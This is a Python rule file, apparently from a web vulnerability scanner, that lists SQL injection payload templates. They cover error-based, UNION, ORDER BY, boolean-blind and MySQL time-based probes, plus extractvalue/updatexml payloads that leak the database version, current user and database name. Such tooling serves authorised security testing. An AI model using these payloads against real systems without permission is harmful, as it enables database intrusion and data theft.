from __future__ import annotations

_SLEEP = 3


SQLI_RULES: list[dict] = [
    # error: 에러 기반 (DB 에러 메시지 노출로 판정)
    {
        "attack_id": "PL-SQLI-ERROR-META",
        "vuln_type": "sqli",
        "technique": "error_meta",
        "category": "error",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                "{value}'",
                '{value}"',
                "{value};",
                "{value}NULL",
                "{value}'(",
                "{value})",
                "{value}(",
                "{value}'\"",
            ],
        },
    },
    {
        # UNION — 컬럼 수 불일치 시 "column count doesn't match" 에러를 유발,
        # judge_union_sqli 가 그 에러 시그니처로 판정하므로 error 계열.
        "attack_id": "PL-SQLI-UNION",
        "vuln_type": "sqli",
        "technique": "union",
        "category": "error",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                "{value} UNION ALL SELECT NULL -- ",
                "{value}' UNION ALL SELECT NULL -- ",
                '{value}" UNION ALL SELECT NULL -- ',
                "{value}) UNION ALL SELECT NULL -- ",
                "{value}') UNION ALL SELECT NULL -- ",
                '{value}") UNION ALL SELECT NULL -- ',
            ],
        },
    },
    {
        "attack_id": "PL-SQLI-ORDERBY",
        "vuln_type": "sqli",
        "technique": "order_by",
        "category": "error",
        "sequence": ["baseline", "attack"],

        "payload_templates": {
            "attack": [
                "{value} ORDER BY 100-- ",
                "{value}' ORDER BY 100-- ",
                '{value}" ORDER BY 100-- ',
                "{value} ORDER BY 9999-- ",
                "{value}' ORDER BY 9999-- ",
                '{value}" ORDER BY 9999-- ',
            ],
        },
    },
    {
        "attack_id": "PL-SQLI-ERROR-EXTRACT",
        "vuln_type": "sqli",
        "technique": "error_extract",
        "category": "error",
        "judgment": "extraction",
        "extract_marker": "~~",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                "{value} AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ",
                "{value}' AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ",
                '{value}" AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ',
                "{value} AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ",
                "{value}' AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ",
                '{value}" AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ',
                "{value} AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ",
                "{value}' AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ",
                '{value}" AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ',
            ],
        },
    },
    # boolean: 불리언 블라인드 (참/거짓 응답 차이로 판정)
    {
        "attack_id": "PL-SQLI-BOOLEAN",
        "vuln_type": "sqli",
        "technique": "boolean",
        "category": "boolean",
        "sequence": ["baseline", "and_true", "and_false", "or_true", "or_false", "control"],

        "payload_templates": {
            "and_true": [
                "{value} AND 1=1 -- ",
                "{value}' AND '1'='1' -- ",
                '{value}" AND "1"="1" -- ',
                "{value} AND 1=1",
                "{value}' AND '1'='1",
                '{value}" AND "1"="1"',
            ],
            "and_false": [
                "{value} AND 1=2 -- ",
                "{value}' AND '1'='2' -- ",
                '{value}" AND "1"="2" -- ',
                "{value} AND 1=2",
                "{value}' AND '1'='2",
                '{value}" AND "1"="2"',
            ],
            "or_true": [
                "{value} OR 1=1 -- ",
                "{value}' OR '1'='1' -- ",
                '{value}" OR "1"="1" -- ',
                "{value} OR 1=1",
                "{value}' OR '1'='1",
                '{value}" OR "1"="1"',
            ],
            "or_false": [
                "{value} OR 1=2 -- ",
                "{value}' OR '1'='2' -- ",
                '{value}" OR "1"="2" -- ',
                "{value} OR 1=2",
                "{value}' OR '1'='2",
                '{value}" OR "1"="2"',
            ],
            "control": [
                "{value}XYZABCDEFGHIJ",
                "{value}XYZABCDEFGHIJ' -- ",
                '{value}XYZABCDEFGHIJ" -- ',
            ],
        },
    },
    # time: 시간 기반 블라인드 (sleep 지연으로 판정)
    {
        "attack_id": "PL-SQLI-TIME-MYSQL",
        "vuln_type": "sqli",
        "technique": "time_mysql",
        "category": "time",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                f"{{value}} / sleep({_SLEEP}) ",
                f"{{value}}' / sleep({_SLEEP}) / '",
                f'{{value}}" / sleep({_SLEEP}) / "',
                f"{{value}} AND 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f"{{value}}' AND 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f'{{value}}" AND 0 IN (SELECT sleep({_SLEEP}) ) -- ',
                f"{{value}} WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f"{{value}}' WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f'{{value}}" WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- ',
                f"{{value}} OR 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f"{{value}}' OR 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f'{{value}}" OR 0 IN (SELECT sleep({_SLEEP}) ) -- ',
            ],
        },
    },
]